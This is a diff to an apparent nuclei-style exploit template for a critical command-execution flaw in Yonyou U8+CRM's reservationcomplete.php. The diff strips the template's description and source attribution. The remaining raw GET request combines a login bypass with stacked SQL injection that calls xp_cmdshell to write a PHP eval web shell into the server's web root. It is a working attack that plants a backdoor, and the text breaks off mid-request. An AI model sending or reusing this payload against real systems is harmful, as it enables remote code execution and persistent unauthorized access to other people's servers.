@@ -3,11 +3,8 @@ info:
   name: 用友U8+CRM接口reservationcomplete存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ne2xggyv7xddgwts'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ne2xggyv7xddgwts
 http:
 - raw:
   - 'GET /bgt/reservationcomplete.php?DontCheckLogin=1&ID=1112;exec%20master..xp_cmdshell%20%27echo%20^%3C?php%20@eval($_POST[x]);?^%3E%20%3E%20D:\U8SOFT\turbocrm70\code\www\shell.php%27; HTTP/1.1
